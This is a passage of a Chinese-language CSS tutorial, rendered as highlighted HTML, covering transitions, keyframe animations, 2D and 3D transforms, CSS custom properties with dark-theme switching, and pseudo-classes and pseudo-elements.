class="hljs-selector-pseudo">:active</span> &#123;<br>    <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">brightness</span>(<span class="hljs-number">0.95</span>) <span class="hljs-built_in">drop-shadow</span>(<span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-过渡与动画（transition、-keyframes、animation）"><a href="#3-3-过渡与动画（transition、-keyframes、animation）" class="headerlink" title="3.3 过渡与动画（transition、@keyframes、animation）"></a>3.3 过渡与动画（transition、@keyframes、animation）</h2><h3 id="CSS过渡（transition）"><a href="#CSS过渡（transition）" class="headerlink" title="CSS过渡（transition）"></a>CSS过渡（transition）</h3><p>实现属性变化的平滑过渡（适合简单的交互效果）</p><p><strong>核心属性</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">transition</span>: <br>    [property] [duration] [timing-function] [delay];<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>参数详解：<ul><li>property：要过渡的属性（如 all、opacity）</li><li>duration：持续时间（0.3s 或 300ms）</li><li>timing-function：速度曲线（ease-in-out）</li><li>delay：延迟时间（可选）</li></ul></li></ul><p><strong>贝塞尔曲线进阶</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 自定义缓动曲线（阿里Ant Motion规范） */</span><br><span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.4s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.68</span>, -<span class="hljs-number">0.6</span>, <span class="hljs-number">0.32</span>, <span class="hljs-number">1.6</span>);<br></code></pre></td></tr></table></figure><ul><li>常用预设：<ul><li>ease-in-out：平滑加减速</li><li>linear：均速</li><li>steps(4)：分步动画</li></ul></li></ul><p><strong>实践</strong></p><p>（1）硬件加速</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span>;<br>  <span class="hljs-attribute">will-change</span>: transform; <span class="hljs-comment">/* 预提示浏览器 */</span><br>&#125;<br><span class="hljs-selector-class">.card</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">5px</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="关键帧动画（-keyframes）"><a href="#关键帧动画（-keyframes）" class="headerlink" title="关键帧动画（@keyframes）"></a>关键帧动画（@keyframes）</h3><p>定义复杂的多阶段动画，适合需要精确控制的场景。</p><p><strong>基本语法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@keyframes</span> slideIn &#123;<br>  <span class="hljs-selector-tag">from</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">100%</span>); &#125;<br>  <span class="hljs-selector-tag">to</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0</span>); &#125;<br>&#125;<br><br><span class="hljs-comment">/* 或百分比控制 */</span><br><span class="hljs-keyword">@keyframes</span> pulse &#123;<br>  <span class="hljs-number">0%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>; &#125;<br>  <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>动画属性（animation）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">animation</span>: <br>    [name] [duration] [timing-function] [delay] <br>    [iteration-count] [direction] [fill-mode];<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>参数扩展：<ul><li>iteration-count：播放次数（infinite表示无限循环）</li><li>direction：alternate（往返播放）</li><li>fill-mode：forwards（保留最后一帧）</li></ul></li></ul><p><strong>视频加载动画案例</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@keyframes</span> dotPulse &#123;<br>  <span class="hljs-number">0%</span>, <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1</span>); <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.5</span>); <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.7</span>; &#125;<br>&#125;<br><span class="hljs-selector-class">.loading-dot</span> &#123;<br>  <span class="hljs-attribute">animation</span>: dotPulse <span class="hljs-number">1.5s</span> infinite ease-in-out;<br>&#125;<br><span class="hljs-selector-class">.loading-dot</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>) &#123;<br>  <span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">0.2s</span>;<br>&#125;<br><span class="hljs-selector-class">.loading-dot</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">3</span>) &#123;<br>  <span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">0.4s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>可动画属性性能排行</strong></p><table><thead><tr><th align="left">属性类型</th><th align="left">性能影响</th><th align="left">推荐场景</th></tr></thead><tbody><tr><td align="left">transform</td><td align="left">最优</td><td align="left">位移&#x2F;旋转&#x2F;缩放</td></tr><tr><td align="left">opacity</td><td align="left">优</td><td align="left">淡入淡出</td></tr><tr><td align="left">color</td><td align="left">中</td><td align="left">非高频变化</td></tr><tr><td align="left">width&#x2F;height</td><td align="left">差</td><td align="left">避免在动画中使用</td></tr></tbody></table><h2 id="3-4-变形（transform：rotate、scale、translate）"><a href="#3-4-变形（transform：rotate、scale、translate）" class="headerlink" title="3.4 变形（transform：rotate、scale、translate）"></a>3.4 变形（transform：rotate、scale、translate）</h2><h3 id="transform-核心功能总览"><a href="#transform-核心功能总览" class="headerlink" title="transform 核心功能总览"></a>transform 核心功能总览</h3><p>在不影响文档流的前提下，对元素进行视觉变形，包含四大类操作：</p><table><thead><tr><th align="left">变形类型</th><th align="left">函数示例</th><th align="left">变形基准点（默认）</th></tr></thead><tbody><tr><td align="left">旋转（Rotate）</td><td align="left">rotate(45deg)</td><td align="left">元素中心</td></tr><tr><td align="left">缩放（Scale）</td><td align="left">scale(1.2)</td><td align="left">元素中心</td></tr><tr><td align="left">位移（Translate）</td><td align="left">translate(20px, 50px)</td><td align="left">元素自身位置</td></tr><tr><td align="left">倾斜（Skew）</td><td align="left">skew(15deg)</td><td align="left">元素中心</td></tr></tbody></table><h3 id="二维变形详解"><a href="#二维变形详解" class="headerlink" title="二维变形详解"></a>二维变形详解</h3><p>（1）旋转 - rotate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-rotate</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">30deg</span>); <span class="hljs-comment">/* 顺时针旋转 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>进阶控制：</p><ul><li>rotateX(45deg)：绕X轴旋转（3D效果）</li><li>rotateY(180deg)：绕Y轴旋转（镜面翻转）</li><li>rotateZ(90deg)：等同于rotate()（Z轴垂直于屏幕）</li></ul><p>（2）缩放 - scale</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-scale</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.5</span>); <span class="hljs-comment">/* 整体放大1.5倍 */</span><br>  <span class="hljs-comment">/* 或分开控制 */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scaleX</span>(<span class="hljs-number">1.2</span>) <span class="hljs-built_in">scaleY</span>(<span class="hljs-number">0.8</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>陷阱：</p><ul><li>缩放不影响布局（相邻元素不会自动避让）</li><li>可能引发文字模糊（需配合transform-origin调整基准点）</li></ul><p>（3）位移 - translate</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-translate</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">50%</span>, -<span class="hljs-number">20px</span>); <span class="hljs-comment">/* 水平50% 垂直-20px */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>百分比计算基准：</p><ul><li>translateX(50%)：基于元素自身宽度</li><li>left: 50%：基于父容器宽度</li></ul><p>（4）倾斜 - skew</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-skew</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">skew</span>(<span class="hljs-number">15deg</span>, -<span class="hljs-number">10deg</span>); <span class="hljs-comment">/* X轴15° Y轴-10° */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>应用场景：创建平行四边形按钮、斜切 banner 效果</p><h3 id="变形属性性能排序"><a href="#变形属性性能排序" class="headerlink" title="变形属性性能排序"></a>变形属性性能排序</h3><table><thead><tr><th align="left">变形类型</th><th align="left">性能影响</th><th align="left">推荐场景</th></tr></thead><tbody><tr><td align="left">translate</td><td align="left">最优</td><td align="left">位移动画</td></tr><tr><td align="left">scale</td><td align="left">优</td><td align="left">缩放效果</td></tr><tr><td align="left">rotate</td><td align="left">中</td><td align="left">避免高频旋转</td></tr><tr><td align="left">filter+变形</td><td align="left">差</td><td align="left">谨慎组合使用</td></tr></tbody></table><h2 id="3-5-3D-变换（perspective、transform-style）"><a href="#3-5-3D-变换（perspective、transform-style）" class="headerlink" title="3.5 3D 变换（perspective、transform-style）"></a>3.5 3D 变换（perspective、transform-style）</h2><h3 id="3D-变换核心概念"><a href="#3D-变换核心概念" class="headerlink" title="3D 变换核心概念"></a>3D 变换核心概念</h3><p>CSS 3D 变换通过模拟三维坐标系（X&#x2F;Y&#x2F;Z 轴）实现立体效果，关键依赖两个属性：</p><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left">perspective</td><td align="left">定义观察者与3D空间的视觉距离</td><td align="left">none</td></tr><tr><td align="left">transform-style</td><td align="left">决定子元素是否保留3D变换特性</td><td align="left">flat</td></tr></tbody></table><h3 id="perspective-景深控制"><a href="#perspective-景深控制" class="headerlink" title="perspective 景深控制"></a>perspective 景深控制</h3><p>原理：模拟人眼到3D物体的距离，数值越小透视效果越强。</p><p><strong>基础用法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">perspective</span>: <span class="hljs-number">1000px</span>; <span class="hljs-comment">/* 推荐值：500-2000px */</span><br>&#125;<br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">45deg</span>); <span class="hljs-comment">/* 此时会有3D透视效果 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>两种设置方式</strong></p><p>（1）场景景深（父元素设置，影响所有子元素）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.scene</span> &#123;<br>  <span class="hljs-attribute">perspective</span>: <span class="hljs-number">1200px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）个体景深（元素自身设置，仅影响当前元素）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">perspective</span>(<span class="hljs-number">1200px</span>) <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">45deg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>性能优化</strong></p><ul><li>避免动态修改perspective（触发重排）</li><li>移动端建议值≥800px（防止过度变形）</li></ul><h3 id="transform-style-3D-空间继承"><a href="#transform-style-3D-空间继承" class="headerlink" title="transform-style 3D 空间继承"></a>transform-style 3D 空间继承</h3><p>控制子元素是否在独立 3D 空间中渲染：</p><table><thead><tr><th align="left">值</th><th align="left">效果</th><th align="left">应用场景</th></tr></thead><tbody><tr><td align="left">flat</td><td align="left">子元素被压扁到2D平面（默认）</td><td align="left">普通变形</td></tr><tr><td align="left">preserve-3d</td><td align="left">子元素保持3D空间关系</td><td align="left">复杂3D组合体</td></tr></tbody></table><p><strong>典型案例：立方体制作</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;cube&quot;&gt;<br>  &lt;div class=&quot;face front&quot;&gt;Front&lt;/div&gt;<br>  &lt;div class=&quot;face back&quot;&gt;Back&lt;/div&gt;<br>  &lt;!-- 其他4个面 --&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.cube</span> &#123;<br>  <span class="hljs-attribute">transform-style</span>: preserve-<span class="hljs-number">3</span>d;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">15deg</span>) <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">30deg</span>);<br>&#125;<br><span class="hljs-selector-class">.face</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;<br>&#125;<br><span class="hljs-selector-class">.front</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">100px</span>); &#125;<br><span class="hljs-selector-class">.back</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">180deg</span>) <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">100px</span>); &#125;<br><span class="hljs-comment">/* 其他面类似 */</span><br></code></pre></td></tr></table></figure><h3 id="3D-变换函数进阶"><a href="#3D-变换函数进阶" class="headerlink" title="3D 变换函数进阶"></a>3D 变换函数进阶</h3><p><strong>三维位移</strong></p><table><thead><tr><th align="left">函数</th><th align="left">轴方向</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">translateZ(z)</td><td align="left">垂直于屏幕（远近）</td><td align="left">translateZ(50px)</td></tr><tr><td align="left">translate3d(x,y,z)</td><td align="left">三维复合位移</td><td align="left">translate3d(0, 10%, 20px)</td></tr></tbody></table><p><strong>三维旋转</strong></p><table><thead><tr><th align="left">函数</th><th align="left">旋转轴</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">rotateX(angle)</td><td align="left">水平轴（上下翻转）</td><td align="left">rotateX(45deg)</td></tr><tr><td align="left">rotateY(angle)</td><td align="left">垂直轴（左右翻转）</td><td align="left">rotateY(180deg)</td></tr><tr><td align="left">rotate3d(x,y,z,a)</td><td align="left">自定义旋转轴</td><td align="left">rotate3d(1,1,0,45deg)</td></tr></tbody></table><h3 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h3><p>（1）复合动画策略</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 错误示范：连续修改不同属性 */</span><br><span class="hljs-keyword">@keyframes</span> bad-animation &#123;<br>  <span class="hljs-number">0%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">0</span>); &#125;<br>  <span class="hljs-number">50%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">100px</span>); &#125;<br>  <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">180deg</span>); &#125;<br>&#125;<br><br><span class="hljs-comment">/* 正确做法：保持相同变换属性 */</span><br><span class="hljs-keyword">@keyframes</span> good-animation &#123;<br>  <span class="hljs-number">0%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">0</span>) <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0</span>); &#125;<br>  <span class="hljs-number">100%</span> &#123; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateX</span>(<span class="hljs-number">180deg</span>) <span class="hljs-built_in">translateY</span>(<span class="hljs-number">100px</span>); &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="第四章：CSS-高级特性"><a href="#第四章：CSS-高级特性" class="headerlink" title="第四章：CSS 高级特性"></a>第四章：CSS 高级特性</h1><h2 id="4-1-变量（CSS-Custom-Properties）"><a href="#4-1-变量（CSS-Custom-Properties）" class="headerlink" title="4.1 变量（CSS Custom Properties）"></a>4.1 变量（CSS Custom Properties）</h2><h3 id="基础概念与语法"><a href="#基础概念与语法" class="headerlink" title="基础概念与语法"></a>基础概念与语法</h3><p>CSS 变量（又成自定义属性）是 CSS 的动态存储机制，具有级联继承特性</p><p><strong>定义与使用</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 定义变量（带--前缀） */</span><br><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--primary-color</span>: <span class="hljs-number">#4285f4</span>;<br>  <span class="hljs-attr">--spacing-unit</span>: <span class="hljs-number">8px</span>;<br>&#125;<br><br><span class="hljs-comment">/* 使用变量（通过var()函数） */</span><br><span class="hljs-selector-class">.button</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--primary-color);<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-built_in">var</span>(--spacing-unit) <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--spacing-unit) * <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>作用域规则</strong></p><ul><li>全局变量：定义在 <code>:root</code> 选择器内</li><li>局部变量：定义在特定选择器内</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attr">--card-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>); <span class="hljs-comment">/* 仅.card内有效 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="核心特性解析"><a href="#核心特性解析" class="headerlink" title="核心特性解析"></a>核心特性解析</h3><p><strong>动态计算能力</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--base-size</span>: <span class="hljs-number">16px</span>;<br>  <span class="hljs-attr">--h1-size</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--base-size) * <span class="hljs-number">2</span>);<br>&#125;<br><span class="hljs-selector-tag">h1</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-built_in">var</span>(--h1-size); &#125;<br></code></pre></td></tr></table></figure><p><strong>回退机制</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.element</span> &#123;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--undefined-var, <span class="hljs-number">#f00</span>); <span class="hljs-comment">/* 变量不存在时使用#f00 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>类型灵活性</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--theme-gradient</span>: <span class="hljs-built_in">linear-gradient</span>(to right, <span class="hljs-number">#ff8a00</span>, <span class="hljs-number">#da1b60</span>);<br>  <span class="hljs-attr">--mobile-breakpoint</span>: <span class="hljs-number">768px</span>;<br>  <span class="hljs-attr">--transition-config</span>: <span class="hljs-number">0.3s</span> ease-in-out;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="应用场景示例：主题切换"><a href="#应用场景示例：主题切换" class="headerlink" title="应用场景示例：主题切换"></a>应用场景示例：主题切换</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 定义主题变量 */</span><br><span class="hljs-selector-pseudo">:root</span> &#123;<br>  <span class="hljs-attr">--bg-color</span>: <span class="hljs-number">#fff</span>;<br>  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#333</span>;<br>&#125;<br><br><span class="hljs-comment">/* 暗色模式 */</span><br><span class="hljs-selector-attr">[data-theme=<span class="hljs-string">&quot;dark&quot;</span>]</span> &#123;<br>  <span class="hljs-attr">--bg-color</span>: <span class="hljs-number">#222</span>;<br>  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#f0f0f0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--bg-color);<br>  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color);<br>  <span class="hljs-attribute">transition</span>: background <span class="hljs-number">0.3s</span>, color <span class="hljs-number">0.3s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// JS切换主题</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;data-theme&#x27;</span>, <span class="hljs-string">&#x27;dark&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="4-2-伪类与伪元素（-hover、-before、-selection）"><a href="#4-2-伪类与伪元素（-hover、-before、-selection）" class="headerlink" title="4.2 伪类与伪元素（:hover、::before、::selection）"></a>4.2 伪类与伪元素（:hover、::before、::selection）</h2><h3 id="核心概念区分"><a href="#核心概念区分" class="headerlink" title="核心概念区分"></a>核心概念区分</h3><table><thead><tr><th align="left">特性</th><th align="left">伪类（Pseudo-class）</th><th align="left">伪元素（Pseudo-element）</th></tr></thead><tbody><tr><td align="left">语法</td><td align="left">单冒号（:hover）</td><td align="left">双冒号（::before）</td></tr><tr><td align="left">作用对象</td><td align="left">选择元素的特定状态</td><td align="left">创建元素的虚拟子元素</td></tr><tr><td align="left">DOM表现</td><td align="left">不创建新节点</td><td align="left">创建文档树外的抽象元素</td></tr><tr><td align="left">典型应用</td><td align="left">交互状态（如:hover）</td><td align="left">装饰性内容（如::before）</td></tr></tbody></table><h3 id="伪类详解（状态选择器）"><a href="#伪类详解（状态选择器）" class="headerlink" title="伪类详解（状态选择器）"></a>伪类详解（状态选择器）</h3><p><strong>动态交互伪类</strong></p><table><thead><tr><th align="left">伪类</th><th align="left">触发条件</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">:hover</td><td align="left">鼠标悬停</td><td align="left">a:hover { color: red }</td></tr><tr><td align="left">:active</td><td align="left">元素被激活（如点击按下）</td><td align="left">button:active { transform: scale(0.98) }</td></tr><tr><td align="left">:focus</td><td align="left">获得焦点（表单&#x2F;可聚焦元素）</td><td align="left">input:focus { border-color: blue }</td></tr><tr><td align="left">:focus-visible</td><td align="left">键盘聚焦时生效</td><td align="left">兼容outline无障碍设计</td></tr></tbody></table><p><strong>结构伪类</strong></p><table><thead><tr><th align="left">伪类</th><th align="left">匹配规则</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">:first-child</td><td align="left">父元素的首个子元素</td><td align="left">li:first-child { font-weight: bold }</td></tr><tr><td align="left">:nth-child(n)</td><td align="left">第n个子元素（支持公式）</td><td align="left">tr:nth-child(2n+1) { background: #f5f5f5 }</td></tr><tr><td align="left">:not(selector)</td><td align="left">反向选择器</td><td align="left">div:not(.hidden) { display: block }</td></tr></tbody></table><h3 id="伪元素详解（虚拟内容生成）"><a href="#伪元素详解（虚拟内容生成）" class="headerlink" title="伪元素详解（虚拟内容生成）"></a>伪元素详解（虚拟内容生成）</h3><p><strong>核心伪元素</strong></p><table><thead><tr><th align="left">伪元素</th><th align="left">作用</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">::before</td><td align="left">在元素内容前插入</td><td align="left">.alert::before { content: “!” }</td></tr><tr><td align="left">::after</td><td align="left">在元素内容后插入</td><td align="left">清除浮动&#x2F;工具提示</td></tr><tr><td align="left">::first-line</td><td align="left">选中首行文本</td><td align="left">p::first-line { font-size: 1.2em }</td></tr><tr><td align="left">::selection</td><td align="left">用户选中的文本</td><td align="left">::selection { background: gold }</td></tr></tbody></table><p><strong>关键技术要点</strong></p><ol><li>content 属性必须设置（空字符串也要设置）</li><li>伪元素不接受 DOM 事件</li><li>默认位于主元素下层，可通过 <code>z-index</code> 调整</li></ol><h3 id="组合使用技巧示例：纯-CSS-实现工具提示"><a href="#组合使用技巧示例：纯-CSS-实现工具提示" class="headerlink" title="组合使用技巧示例：纯 CSS 实现工具提示"></a>组合使用技巧示例：纯 CSS 实现工具提示</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 